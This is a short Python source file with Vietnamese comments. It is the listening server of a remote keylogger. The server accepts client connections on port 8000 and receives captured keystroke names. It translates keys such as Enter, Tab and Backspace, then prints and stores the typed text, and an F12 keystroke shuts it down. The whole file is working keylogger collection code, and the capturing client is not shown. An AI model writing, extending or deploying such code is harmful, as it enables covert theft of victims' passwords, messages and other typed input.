import socket
import threading

# port = 8000
keyLogger_data = []
port = 8000
stop_flag = False  # Cờ để kiểm soát việc dừng chương trình
keylogger_thread = None 
    
def keyLogger():
    global stop_flag

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as serverSocket:
        serverSocket.bind(('', port))
        serverSocket.listen(5)
        
        while not stop_flag:
            clientSocket, clientAddress = serverSocket.accept()
            print('Got connection from', clientAddress)
            
            with clientSocket:
                clientSocket.send('keylogger'.encode())
                
                while not stop_flag:
                    data = clientSocket.recv(1024)
                    if not data:
                        break
                    
                    data = data.decode('utf-8')
                    data = data.replace("'b'", "")
                    data = data.replace("'", "")
                    
                    if data == "Key.backspace":
                        data = "back"
                    elif data == "Key.f12":
                        stop_flag = True  # Đặt cờ để dừng chương trình
                        clientSocket.send('stop'.encode())  # Thông báo client dừng
                        break
                    else:
                        if data == "Key.shift":
                            data = ""
                        if data == "Key.ctrl_l":
                            data = ""
                        if data == "Key.alt_l":
                            data = ""
                        if data == "Key.tab":
                            data = "\t"
                        if data == "Key.enter":
                            data = "\n"
                        if data == "Key.space":
                            data = "_"
                    print(data, end="")
                    keyLogger_data.append(data)

                # Đóng socket client sau khi hoàn thành công việc
                clientSocket.close()

        # Đóng socket server khi kết thúc chương trình
        serverSocket.close()
keyLogger()